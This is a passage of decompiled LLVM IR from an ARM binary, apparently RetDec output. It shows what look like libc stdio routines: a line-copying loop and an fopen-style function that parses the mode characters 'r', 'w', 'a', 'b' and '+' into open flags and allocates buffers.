dec_label_pc_18124:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_18124 = load i32, i32* @r4, align 4
  store i32 %v3_18124, i32* %stack_var_-24, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 %arg2, i32* %r6.global-to-local, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  store i32 2147483647, i32* %r8.global-to-local, align 4
  %v2_1813c2 = icmp eq i32 %arg3, 0
  store i1 %v2_1813c2, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1813c2, label %dec_label_pc_181cc, label %dec_label_pc_18144

dec_label_pc_1813cthread-pre-split:               ; preds = %dec_label_pc_18144
  %v3_1815c = load i32, i32* %r6.global-to-local, align 4
  %v5_1815c = add i32 %v3_1815c, %v3_18154
  store i32 %v5_1815c, i32* %r6.global-to-local, align 4
  %v4_18160 = load i32, i32* %r5.global-to-local, align 4
  %v5_18160 = sub i32 %v4_18160, %v3_18154
  store i32 %v5_18160, i32* %r5.global-to-local, align 4
  %v2_1813c = icmp eq i32 %v5_18160, 0
  store i1 %v2_1813c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1813c, label %dec_label_pc_1813c.dec_label_pc_181cc.loopexit_crit_edge, label %dec_label_pc_1813cthread-pre-split.dec_label_pc_18144_crit_edge

dec_label_pc_1813cthread-pre-split.dec_label_pc_18144_crit_edge: ; preds = %dec_label_pc_1813cthread-pre-split
  %v3_18144.pre = load i32, i32* %r8.global-to-local, align 4
  %v0_18150.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_18144

dec_label_pc_18144:                               ; preds = %dec_label_pc_18124, %dec_label_pc_1813cthread-pre-split.dec_label_pc_18144_crit_edge
  %v0_18150 = phi i32 [ %v0_18150.pre, %dec_label_pc_1813cthread-pre-split.dec_label_pc_18144_crit_edge ], [ %tmp, %dec_label_pc_18124 ]
  %v0_1814c = phi i32 [ %v5_1815c, %dec_label_pc_1813cthread-pre-split.dec_label_pc_18144_crit_edge ], [ %arg2, %dec_label_pc_18124 ]
  %v3_18144 = phi i32 [ %v3_18144.pre, %dec_label_pc_1813cthread-pre-split.dec_label_pc_18144_crit_edge ], [ 2147483647, %dec_label_pc_18124 ]
  %v0_18148.in = phi i32 [ %v5_18160, %dec_label_pc_1813cthread-pre-split.dec_label_pc_18144_crit_edge ], [ %arg3, %dec_label_pc_18124 ]
  %v3_18148 = phi i32 [ %v5_18160, %dec_label_pc_1813cthread-pre-split.dec_label_pc_18144_crit_edge ], [ %arg3, %dec_label_pc_18124 ]
  %v0_18148 = icmp slt i32 %v0_18148.in, 0
  %storemerge = select i1 %v0_18148, i32 %v3_18144, i32 %v3_18148
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  store i32 %v0_1814c, i32* %r1.global-to-local, align 4
  %v1_18150 = add i32 %v0_18150, 4
  %v2_18150 = inttoptr i32 %v1_18150 to i32*
  %v3_18150 = load i32, i32* %v2_18150, align 4
  %v3_18154 = call i32 @function_12978(i32 %v3_18150, i32 %v0_1814c)
  %v1_18158 = icmp slt i32 %v3_18154, 0
  %v2_18158 = icmp eq i32 %v3_18154, 0
  store i1 %v2_18158, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_18158, label %dec_label_pc_18168, label %dec_label_pc_1813cthread-pre-split

dec_label_pc_18168:                               ; preds = %dec_label_pc_18144
  %v0_18168 = load i32, i32* %r4.global-to-local, align 4
  %v1_18168 = inttoptr i32 %v0_18168 to i16*
  %v2_18168 = load i16, i16* %v1_18168, align 2
  %v3_18168 = zext i16 %v2_18168 to i32
  store i32 %v3_18168, i32* %r3.global-to-local, align 4
  %v1_1816c = add i32 %v0_18168, 8
  store i32 %v1_1816c, i32* %r1.global-to-local, align 4
  %v1_18170 = inttoptr i32 %v1_1816c to i32*
  %v2_18170 = load i32, i32* %v1_18170, align 4
  store i32 %v2_18170, i32* %r1.global-to-local, align 4
  %v3_18170 = add i32 %v0_18168, 12
  %v4_18170 = inttoptr i32 %v3_18170 to i32*
  %v5_18170 = load i32, i32* %v4_18170, align 4
  %v1_18174 = or i32 %v3_18168, 8
  store i32 %v1_18174, i32* %r3.global-to-local, align 4
  %v2_18178 = sub i32 %v5_18170, %v2_18170
  store i32 %v2_18178, i32* %r2.global-to-local, align 4
  %v9_18178 = icmp eq i32 %v5_18170, %v2_18170
  store i1 %v9_18178, i1* %cpsr_z.global-to-local, align 1
  %v1_1817c = trunc i32 %v1_18174 to i16
  store i16 %v1_1817c, i16* %v1_18168, align 2
  br i1 %v9_18178, label %dec_label_pc_18168.dec_label_pc_181c8_crit_edge, label %dec_label_pc_18184

dec_label_pc_18168.dec_label_pc_181c8_crit_edge:  ; preds = %dec_label_pc_18168
  %v0_181c8.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_181c8

dec_label_pc_18184:                               ; preds = %dec_label_pc_18168
  %v0_18184 = load i32, i32* %r2.global-to-local, align 4
  %v1_18184 = load i32, i32* %r5.global-to-local, align 4
  %v3_18184 = icmp ult i32 %v0_18184, %v1_18184
  %v9_18184 = icmp eq i32 %v0_18184, %v1_18184
  store i1 %v9_18184, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_18184, label %.preheader, label %bb23

bb23:                                             ; preds = %dec_label_pc_18184
  store i32 %v1_18184, i32* %r2.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_18184, %bb23
  %v2_18198.pre = load i32, i32* %r1.global-to-local, align 4
  br label %bb24

bb24:                                             ; preds = %.preheader, %dec_label_pc_181ac
  %v2_18198 = phi i32 [ %v2_18198.pre, %.preheader ], [ %v1_181b0, %dec_label_pc_181ac ]
  %v0_1818c = load i32, i32* %r6.global-to-local, align 4
  %v1_1818c = inttoptr i32 %v0_1818c to i8*
  %v2_1818c = load i8, i8* %v1_1818c, align 1
  %v3_1818c = zext i8 %v2_1818c to i32
  store i32 %v3_1818c, i32* %r3.global-to-local, align 4
  %v7_18190 = icmp eq i8 %v2_1818c, 10
  store i1 %v7_18190, i1* %cpsr_z.global-to-local, align 1
  %v1_18194 = add i32 %v0_1818c, 1
  store i32 %v1_18194, i32* %r6.global-to-local, align 4
  %v3_18198 = inttoptr i32 %v2_18198 to i8*
  store i8 %v2_1818c, i8* %v3_18198, align 1
  %v0_1819c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1819c, label %dec_label_pc_181a0, label %dec_label_pc_181ac

dec_label_pc_181a0:                               ; preds = %bb24
  %v0_181a0 = load i32, i32* %r4.global-to-local, align 4
  %v1_181a0 = inttoptr i32 %v0_181a0 to i16*
  %v2_181a0 = load i16, i16* %v1_181a0, align 2
  %v3_181a0 = zext i16 %v2_181a0 to i32
  store i32 %v3_181a0, i32* %r3.global-to-local, align 4
  %v1_181a4 = and i32 %v3_181a0, 256
  %v2_181a4 = icmp eq i32 %v1_181a4, 0
  store i1 %v2_181a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_181a4, label %dec_label_pc_181ac, label %dec_label_pc_181a0.dec_label_pc_181b8_crit_edge

dec_label_pc_181a0.dec_label_pc_181b8_crit_edge:  ; preds = %dec_label_pc_181a0
  %v0_181bc.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_181b8

dec_label_pc_181ac:                               ; preds = %dec_label_pc_181a0, %bb24
  %v0_181ac = load i32, i32* %r2.global-to-local, align 4
  %v1_181ac = add i32 %v0_181ac, -1
  store i32 %v1_181ac, i32* %r2.global-to-local, align 4
  %v7_181ac = icmp eq i32 %v0_181ac, 1
  store i1 %v7_181ac, i1* %cpsr_z.global-to-local, align 1
  %v0_181b0 = load i32, i32* %r1.global-to-local, align 4
  %v1_181b0 = add i32 %v0_181b0, 1
  store i32 %v1_181b0, i32* %r1.global-to-local, align 4
  br i1 %v7_181ac, label %dec_label_pc_181ac.dec_label_pc_181b8_crit_edge, label %bb24

dec_label_pc_181ac.dec_label_pc_181b8_crit_edge:  ; preds = %dec_label_pc_181ac
  %v0_181b8.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_181b8

dec_label_pc_181b8:                               ; preds = %dec_label_pc_181a0.dec_label_pc_181b8_crit_edge, %dec_label_pc_181ac.dec_label_pc_181b8_crit_edge
  %v0_181bc = phi i32 [ %v1_181b0, %dec_label_pc_181ac.dec_label_pc_181b8_crit_edge ], [ %v0_181bc.pre, %dec_label_pc_181a0.dec_label_pc_181b8_crit_edge ]
  %v0_181b8 = phi i32 [ %v0_181b8.pre, %dec_label_pc_181ac.dec_label_pc_181b8_crit_edge ], [ %v0_181a0, %dec_label_pc_181a0.dec_label_pc_181b8_crit_edge ]
  %v1_181b8 = add i32 %v0_181b8, 8
  %v2_181b8 = inttoptr i32 %v1_181b8 to i32*
  %v3_181b8 = load i32, i32* %v2_181b8, align 4
  store i32 %v3_181b8, i32* %r3.global-to-local, align 4
  %v2_181bc = add i32 %v0_181b8, 16
  %v3_181bc = inttoptr i32 %v2_181bc to i32*
  store i32 %v0_181bc, i32* %v3_181bc, align 4
  %v0_181c0 = load i32, i32* %r3.global-to-local, align 4
  %v1_181c0 = load i32, i32* %r1.global-to-local, align 4
  %v2_181c0 = sub i32 %v1_181c0, %v0_181c0
  store i32 %v2_181c0, i32* %r3.global-to-local, align 4
  %v1_181c4 = load i32, i32* %r5.global-to-local, align 4
  %v2_181c4 = sub i32 %v1_181c4, %v2_181c0
  store i32 %v2_181c4, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_181c8

dec_label_pc_181c8:                               ; preds = %dec_label_pc_18168.dec_label_pc_181c8_crit_edge, %dec_label_pc_181b8
  %v0_181c8 = phi i32 [ %v0_181c8.pre, %dec_label_pc_18168.dec_label_pc_181c8_crit_edge ], [ %v2_181c4, %dec_label_pc_181b8 ]
  %v1_181c8 = load i32, i32* @r7, align 4
  %v2_181c8 = sub i32 %v1_181c8, %v0_181c8
  br label %dec_label_pc_181cc

dec_label_pc_1813c.dec_label_pc_181cc.loopexit_crit_edge: ; preds = %dec_label_pc_1813cthread-pre-split
  %v0_181cc.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_181cc

dec_label_pc_181cc:                               ; preds = %dec_label_pc_18124, %dec_label_pc_1813c.dec_label_pc_181cc.loopexit_crit_edge, %dec_label_pc_181c8
  %v0_181cc = phi i32 [ %v2_181c8, %dec_label_pc_181c8 ], [ %v0_181cc.pre.pre, %dec_label_pc_1813c.dec_label_pc_181cc.loopexit_crit_edge ], [ 0, %dec_label_pc_18124 ]
  %v2_181d0 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_181d0, i32* %r4.global-to-local, align 4
  ret i32 %v0_181cc

; uselistorder directives
  uselistorder i32 %v0_181b8, { 1, 0 }
  uselistorder i32 %v1_181b0, { 0, 2, 1 }
  uselistorder i32 %v0_181ac, { 1, 0 }
  uselistorder i32 %v1_18184, { 0, 2, 1 }
  uselistorder i32 %v0_18184, { 1, 0 }
  uselistorder i32 %v5_18170, { 1, 0 }
  uselistorder i32 %v2_18170, { 1, 0, 2 }
  uselistorder i32 %v3_18154, { 2, 3, 0, 1 }
  uselistorder i32 %v0_1814c, { 1, 0 }
  uselistorder i32 %v5_18160, { 2, 0, 1, 3 }
  uselistorder i32* %r6.global-to-local, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r5.global-to-local, { 0, 3, 4, 2, 1, 5, 6 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 3, 4, 1, 5 }
  uselistorder i32* %r2.global-to-local, { 2, 4, 3, 5, 6, 1, 0 }
  uselistorder i32* %r1.global-to-local, { 4, 1, 5, 3, 2, 6, 7, 8, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder i32 (i32, i32)* @function_12978, { 1, 3, 2, 0 }
  uselistorder i32 %arg3, { 1, 0, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_181cc, { 1, 2, 0 }
  uselistorder label %dec_label_pc_181c8, { 1, 0 }
  uselistorder label %dec_label_pc_181b8, { 1, 0 }
  uselistorder label %bb24, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_18144, { 1, 0 }
}

define i32 @function_181d8() local_unnamed_addr {
dec_label_pc_181d8:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_181d8 = load i32, i32* @r4, align 4
  store i32 %v3_181d8, i32* %stack_var_-36, align 4
  %v6_181d8 = load i32, i32* @r5, align 4
  %v9_181d8 = load i32, i32* @r6, align 4
  %v18_181d8 = load i32, i32* @sb, align 4
  %v24_181d8 = load i32, i32* @fp, align 4
  %v0_181dc = load i32, i32* @r1, align 4
  %v1_181dc = inttoptr i32 %v0_181dc to i8*
  %v2_181dc = load i8, i8* %v1_181dc, align 1
  %v3_181dc = zext i8 %v2_181dc to i32
  store i32 %v3_181dc, i32* @ip, align 4
  %v7_181e4 = icmp eq i8 %v2_181dc, 114
  store i32 180260, i32* @fp, align 4
  %v2_181ec = ptrtoint i32* %stack_var_-72 to i32
  %v0_181f0 = load i32, i32* @r0, align 4
  store i32 %v0_181f0, i32* @r6, align 4
  %v0_181f4 = load i32, i32* @r2, align 4
  store i32 %v0_181f4, i32* @sb, align 4
  %v0_181f8 = load i32, i32* @r3, align 4
  store i32 %v0_181f8, i32* @r5, align 4
  br i1 %v7_181e4, label %dec_label_pc_18244, label %dec_label_pc_18200

dec_label_pc_18200:                               ; preds = %dec_label_pc_181d8
  %v7_18200 = icmp eq i8 %v2_181dc, 119
  br i1 %v7_18200, label %bb, label %dec_label_pc_1820c

bb:                                               ; preds = %dec_label_pc_18200
  store i32 577, i32* @r4, align 4
  br label %dec_label_pc_18248

dec_label_pc_1820c:                               ; preds = %dec_label_pc_18200
  %v7_1820c = icmp eq i8 %v2_181dc, 97
  br i1 %v7_1820c, label %bb32, label %dec_label_pc_18218

bb32:                                             ; preds = %dec_label_pc_1820c
  store i32 1089, i32* @r4, align 4
  br label %dec_label_pc_18248

dec_label_pc_18218:                               ; preds = %dec_label_pc_1820c, %dec_label_pc_182cc, %dec_label_pc_182a0
  %v0_18218 = call i32 @function_12b24()
  store i32 %v0_18218, i32* %r0.global-to-local, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  %v0_18220 = load i32, i32* @sb, align 4
  %v2_18220 = icmp eq i32 %v0_18220, 0
  %v2_18224 = inttoptr i32 %v0_18218 to i32*
  store i32 22, i32* %v2_18224, align 4
  br i1 %v2_18220, label %dec_label_pc_18498, label %dec_label_pc_1822c

dec_label_pc_1822c:                               ; preds = %dec_label_pc_182f0._crit_edge, %dec_label_pc_18218
  %v0_1822c = load i32, i32* @sb, align 4
  %v1_1822c = inttoptr i32 %v0_1822c to i16*
  %v2_1822c = load i16, i16* %v1_1822c, align 2
  %v3_1822c = zext i16 %v2_1822c to i32
  store i32 %v3_1822c, i32* %r3.global-to-local, align 4
  %v1_18230 = and i32 %v3_1822c, 8192
  %v2_18230 = icmp eq i32 %v1_18230, 0
  br i1 %v2_18230, label %dec_label_pc_18498, label %dec_label_pc_18238

dec_label_pc_18238:                               ; preds = %dec_label_pc_1822c
  store i32 %v0_1822c, i32* @r0, align 4
  %v0_1823c = call i32 @function_15850()
  store i32 %v0_1823c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18498

dec_label_pc_18244:                               ; preds = %dec_label_pc_181d8
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_18248

dec_label_pc_18248:                               ; preds = %bb, %bb32, %dec_label_pc_18244
  %v1_18260 = phi i32 [ 1089, %bb32 ], [ 577, %bb ], [ 1, %dec_label_pc_18244 ]
  %v1_18248 = add i32 %v0_181dc, 1
  %v2_18248 = inttoptr i32 %v1_18248 to i8*
  %v3_18248 = load i8, i8* %v2_18248, align 1
  %v7_1824c = icmp eq i8 %v3_18248, 98
  %v1_18248.v0_181dc = select i1 %v7_1824c, i32 %v1_18248, i32 %v0_181dc
  store i32 %v1_18248.v0_181dc, i32* %r3.global-to-local, align 4
  %v1_18258 = add i32 %v1_18248.v0_181dc, 1
  %v2_18258 = inttoptr i32 %v1_18258 to i8*
  %v3_18258 = load i8, i8* %v2_18258, align 1
  %v4_18258 = zext i8 %v3_18258 to i32
  store i32 %v4_18258, i32* @r3, align 4
  %v7_1825c = icmp eq i8 %v3_18258, 43
  br i1 %v7_1825c, label %bb35, label %.thread3

bb35:                                             ; preds = %dec_label_pc_18248
  store i32 %v1_18260, i32* @r3, align 4
  %v2_18264 = add nuw nsw i32 %v1_18260, 1
  store i32 %v2_18264, i32* @r4, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_18248, %bb35
  %v2_18268 = icmp eq i32 %v0_181f4, 0
  br i1 %v2_18268, label %dec_label_pc_18270, label %dec_label_pc_18298

dec_label_pc_18270:                               ; preds = %.thread3
  store i32 80, i32* %r0.global-to-local, align 4
  %v1_18274 = call i32 @function_14ccc(i32 80)
  store i32 %v1_18274, i32* %r0.global-to-local, align 4
  store i32 %v1_18274, i32* @sb, align 4
  %v3_18278 = icmp eq i32 %v1_18274, 0
  br i1 %v3_18278, label %dec_label_pc_1849c, label %dec_label_pc_18280

dec_label_pc_18280:                               ; preds = %dec_label_pc_18270
  %v2_18284 = add i32 %v1_18274, 8
  %v3_18284 = inttoptr i32 %v2_18284 to i32*
  store i32 0, i32* %v3_18284, align 4
  store i32 8192, i32* %r3.global-to-local, align 4
  %v2_1828c = load i32, i32* @sb, align 4
  %v3_1828c = inttoptr i32 %v2_1828c to i16*
  store i16 8192, i16* %v3_1828c, align 2
  %v0_18290 = load i32, i32* @sb, align 4
  %v1_18290 = add i32 %v0_18290, 56
  store i32 %v1_18290, i32* @r0, align 4
  %v1_18294 = call i32 @function_12c90(i32 %v1_18290)
  store i32 %v1_18294, i32* %r0.global-to-local, align 4
  %v0_18298.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_18298

dec_label_pc_18298:                               ; preds = %.thread3, %dec_label_pc_18280
  %v0_182f0 = phi i32 [ %v0_181f8, %.thread3 ], [ %v0_18298.pre, %dec_label_pc_18280 ]
  %v1_18298 = icmp slt i32 %v0_182f0, 0
  br i1 %v1_18298, label %dec_label_pc_182f0, label %dec_label_pc_182a0

dec_label_pc_182a0:                               ; preds = %dec_label_pc_18298
  %v0_182a4 = load i32, i32* @r4, align 4
  %v2_182a4 = and i32 %v0_182a4, ptrtoint ([18 x i8]* @global_var_20003.983 to i32)
  %v1_182a8 = or i32 %v2_182a4, 1
  store i32 %v1_182a8, i32* @r2, align 4
  %v0_182ac = load i32, i32* @r6, align 4
  %v1_182ac = add i32 %v0_182ac, 1
  %v2_182b0 = and i32 %v1_182ac, %v1_182a8
  store i32 %v2_182b0, i32* %r3.global-to-local, align 4
  %v9_182b4 = icmp eq i32 %v2_182b0, %v1_182a8
  %v1_182b8 = load i32, i32* @sb, align 4
  %v2_182b8 = add i32 %v1_182b8, 4
  %v3_182b8 = inttoptr i32 %v2_182b8 to i32*
  store i32 %v0_182f0, i32* %v3_182b8, align 4
  br i1 %v9_182b4, label %dec_label_pc_182c0, label %dec_label_pc_18218

dec_label_pc_182c0:                               ; preds = %dec_label_pc_182a0
  %v0_182c0 = load i32, i32* @r4, align 4
  %v1_182c0 = load i32, i32* @r6, align 4
  %v2_182c0 = sub i32 -1, %v1_182c0
  %v3_182c0 = and i32 %v0_182c0, %v2_182c0
  store i32 %v3_182c0, i32* @r3, align 4
  %v1_182c4 = and i32 %v3_182c0, 1024
  %v2_182c4 = icmp eq i32 %v1_182c4, 0
  br i1 %v2_182c4, label %dec_label_pc_182e4, label %dec_label_pc_182cc

dec_label_pc_182cc:                               ; preds = %dec_label_pc_182c0
  %v0_182cc = load i32, i32* @r5, align 4
  store i32 %v0_182cc, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 1024, i32* @r2, align 4
  %v2_182d8 = call i32 @function_128a0(i32 %v0_182cc, i32 4)
  store i32 %v2_182d8, i32* %r0.global-to-local, align 4
  %v2_182dc = icmp eq i32 %v2_182d8, 0
  br i1 %v2_182dc, label %dec_label_pc_182cc.dec_label_pc_182e4_crit_edge, label %dec_label_pc_18218

dec_label_pc_182cc.dec_label_pc_182e4_crit_edge:  ; preds = %dec_label_pc_182cc
  %v0_182e4.pre = load i32, i32* @r6, align 4
  %v0_182e8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_182e4

dec_label_pc_182e4:                               ; preds = %dec_label_pc_182cc.dec_label_pc_182e4_crit_edge, %dec_label_pc_182c0
  %v0_182e8 = phi i32 [ %v0_182e8.pre, %dec_label_pc_182cc.dec_label_pc_182e4_crit_edge ], [ %v0_182c0, %dec_label_pc_182c0 ]
  %v0_182e4 = phi i32 [ %v0_182e4.pre, %dec_label_pc_182cc.dec_label_pc_182e4_crit_edge ], [ %v1_182c0, %dec_label_pc_182c0 ]
  %v1_182e4 = and i32 %v0_182e4, 131072
  store i32 %v1_182e4, i32* %r3.global-to-local, align 4
  %v2_182e8 = or i32 %v1_182e4, %v0_182e8
  store i32 %v2_182e8, i32* @r4, align 4
  br label %dec_label_pc_18314

dec_label_pc_182f0:                               ; preds = %dec_label_pc_18298
  %v7_182f0 = icmp eq i32 %v0_182f0, -1
  %v0_182fc.pre = load i32, i32* @r4, align 4
  br i1 %v7_182f0, label %dec_label_pc_182f0._crit_edge, label %bb36

bb36:                                             ; preds = %dec_label_pc_182f0
  %v2_182f4 = or i32 %v0_182fc.pre, ptrtoint ([21 x i8]* @global_var_20000.984 to i32)
  store i32 %v2_182f4, i32* @r4, align 4
  br label %dec_label_pc_182f0._crit_edge

dec_label_pc_182f0._crit_edge:                    ; preds = %dec_label_pc_182f0, %bb36
  %v0_182fc = phi i32 [ %v2_182f4, %bb36 ], [ %v0_182fc.pre, %dec_label_pc_182f0 ]
  %v0_182f8 = load i32, i32* @r6, align 4
  store i32 %v0_182f8, i32* %r0.global-to-local, align 4
  store i32 %v0_182fc, i32* %r1.global-to-local, align 4
  store i32 438, i32* @r2, align 4
  %v2_18304 = call i32 @function_125b4(i32 %v0_182f8, i32 %v0_182fc)
  store i32 %v2_18304, i32* %r0.global-to-local, align 4
  %v1_18308 = icmp slt i32 %v2_18304, 0
  %v1_1830c = load i32, i32* @sb, align 4
  %v2_1830c = add i32 %v1_1830c, 4
  %v3_1830c = inttoptr i32 %v2_1830c to i32*
  store i32 %v2_18304, i32* %v3_1830c, align 4
  br i1 %v1_18308, label %dec_label_pc_1822c, label %.dec_label_pc_18314_crit_edge

.dec_label_pc_18314_crit_edge:                    ; preds = %dec_label_pc_182f0._crit_edge
  %v0_18318.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_18314

dec_label_pc_18314:                               ; preds = %.dec_label_pc_18314_crit_edge, %dec_label_pc_182e4
  %v0_18330 = phi i32 [ %v0_18318.pre, %.dec_label_pc_18314_crit_edge ], [ %v2_182e8, %dec_label_pc_182e4 ]
  %v0_18314 = load i32, i32* @sb, align 4
  %v1_18314 = inttoptr i32 %v0_18314 to i16*
  %v2_18314 = load i16, i16* %v1_18314, align 2
  %v3_18314 = zext i16 %v2_18314 to i32
  %v1_18318 = urem i32 %v0_18330, 4
  %v1_1831c = and i32 %v0_18330, 1024
  %v1_18320 = and i32 %v3_18314, 8192
  %v1_18324 = add nuw nsw i32 %v1_18318, 1
  %v2_18328 = or i32 %v1_18320, %v1_1831c
  store i32 %v2_18328, i32* %r3.global-to-local, align 4
  %v1_1832c = xor i32 %v1_18324, 3
  store i32 %v1_1832c, i32* %r1.global-to-local, align 4
  %v1_18330 = and i32 %v0_18330, ptrtoint ([21 x i8]* @global_var_20000.984 to i32)
  store i32 %v1_18330, i32* %r2.global-to-local, align 4
  %v2_18330 = icmp eq i32 %v1_18330, 0
  %v1_18334 = add i32 %v0_18314, 4
  %v2_18334 = inttoptr i32 %v1_18334 to i32*
  %v3_18334 = load i32, i32* %v2_18334, align 4
  store i32 %v3_18334, i32* @r5, align 4
  br i1 %v2_18330, label %bb38, label %bb37

bb37:                                             ; preds = %dec_label_pc_18314
  store i32 32768, i32* %r2.global-to-local, align 4
  br label %bb38

bb38:                                             ; preds = %dec_label_pc_18314, %bb37
  %v0_18340 = phi i32 [ 0, %dec_label_pc_18314 ], [ 32768, %bb37 ]
  %v4_1833c = mul nuw nsw i32 %v1_1832c, 16
  %v5_1833c = or i32 %v2_18328, %v4_1833c
  store i32 %v5_1833c, i32* %r3.global-to-local, align 4
  %v2_18340 = or i32 %v0_18340, %v5_1833c
  store i32 %v2_18340, i32* %r2.global-to-local, align 4
  %v8_18344 = icmp eq i32 %v3_18334, 2147483647
  %v1_18348 = trunc i32 %v2_18340 to i16
  store i16 %v1_18348, i16* %v1_18314, align 2
  br i1 %v8_18344, label %dec_label_pc_18378, label %dec_label_pc_18350

dec_label_pc_18350:                               ; preds = %bb38
  %v0_18350 = call i32 @function_12b24()
  store i32 %v0_18350, i32* @r4, align 4
  %v0_18358 = load i32, i32* @r5, align 4
  store i32 %v0_18358, i32* @r0, align 4
  %v1_1835c = inttoptr i32 %v0_18350 to i32*
  %v2_1835c = load i32, i32* %v1_1835c, align 4
  store i32 %v2_1835c, i32* @r5, align 4
  %v1_18360 = call i32 @function_145ac(i32 %v0_18358)
  store i32 %v1_18360, i32* %r0.global-to-local, align 4
  %v2_18364 = icmp eq i32 %v1_18360, 0
  br i1 %v2_18364, label %.thread5, label %bb39

bb39:                                             ; preds = %dec_label_pc_18350
  %v1_18368 = load i32, i32* @sb, align 4
  %v2_18368 = inttoptr i32 %v1_18368 to i16*
  %v3_18368 = load i16, i16* %v2_18368, align 2
  %v4_18368 = zext i16 %v3_18368 to i32
  %v2_1836c = or i32 %v4_18368, 256
  store i32 %v2_1836c, i32* %r3.global-to-local, align 4
  %v2_18370 = trunc i32 %v2_1836c to i16
  store i16 %v2_18370, i16* %v2_18368, align 2
  br label %.thread5

.thread5:                                         ; preds = %dec_label_pc_18350, %bb39
  %v0_18374 = load i32, i32* @r5, align 4
  %v1_18374 = load i32, i32* @r4, align 4
  %v2_18374 = inttoptr i32 %v1_18374 to i32*
  store i32 %v0_18374, i32* %v2_18374, align 4
  br label %dec_label_pc_18378

dec_label_pc_18378:                               ; preds = %bb38, %.thread5
  %v0_18378 = load i32, i32* @sb, align 4
  %v1_18378 = add i32 %v0_18378, 8
  %v2_18378 = inttoptr i32 %v1_18378 to i32*
  %v3_18378 = load i32, i32* %v2_18378, align 4
  store i32 %v3_18378, i32* %r3.global-to-local, align 4
  %v2_1837c = icmp eq i32 %v3_18378, 0
  br i1 %v2_1837c, label %dec_label_pc_18384, label %bb40

dec_label_pc_18384:                               ; preds = %dec_label_pc_18378
  store i32 4096, i32* %r0.global-to-local, align 4
  %v1_18388 = call i32 @function_14ccc(i32 4096)
  store i32 %v1_18388, i32* %r0.global-to-local, align 4
  %v2_1838c = icmp eq i32 %v1_18388, 0
  %v1_1839c.pre = load i32, i32* @sb, align 4
  br i1 %v2_1838c, label %.thread9, label %.thread8

.thread8:                                         ; preds = %dec_label_pc_18384
  %v2_18390 = inttoptr i32 %v1_1839c.pre to i16*
  %v3_18390 = load i16, i16* %v2_18390, align 2
  %v4_18390 = zext i16 %v3_18390 to i32
  %v2_18394 = add i32 %v1_18388, 4096
  store i32 %v2_18394, i32* %r2.global-to-local, align 4
  %v2_18398 = or i32 %v4_18390, 16384
  store i32 %v2_18398, i32* %r3.global-to-local, align 4
  %v2_1839c = add i32 %v1_1839c.pre, 8
  %v3_1839c = inttoptr i32 %v2_1839c to i32*
  store i32 %v1_18388, i32* %v3_1839c, align 4
  %v1_183a0 = load i32, i32* %r2.global-to-local, align 4
  %v2_183a0 = load i32, i32* @sb, align 4
  %v3_183a0 = add i32 %v2_183a0, 12
  %v4_183a0 = inttoptr i32 %v3_183a0 to i32*
  store i32 %v1_183a0, i32* %v4_183a0, align 4
  %v1_183a4 = load i32, i32* %r3.global-to-local, align 4
  %v2_183a4 = trunc i32 %v1_183a4 to i16
  %v3_183a4 = load i32, i32* @sb, align 4
  %v4_183a4 = inttoptr i32 %v3_183a4 to i16*
  store i16 %v2_183a4, i16* %v4_183a4, align 2
  br label %bb40

.thread9:                                         ; preds = %dec_label_pc_18384
  %v2_1839c19 = add i32 %v1_1839c.pre, 8
  %v3_1839c20 = inttoptr i32 %v2_1839c19 to i32*
  store i32 0, i32* %v3_1839c20, align 4
  %v2_183a8 = load i32, i32* @sb, align 4
  %v3_183a8 = add i32 %v2_183a8, 12
  %v4_183a8 = inttoptr i32 %v3_183a8 to i32*
  store i32 0, i32* %v4_183a8, align 4
  br label %bb40

bb40:                                             ; preds = %.thread8, %dec_label_pc_18378, %.thread9
  store i32 60, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
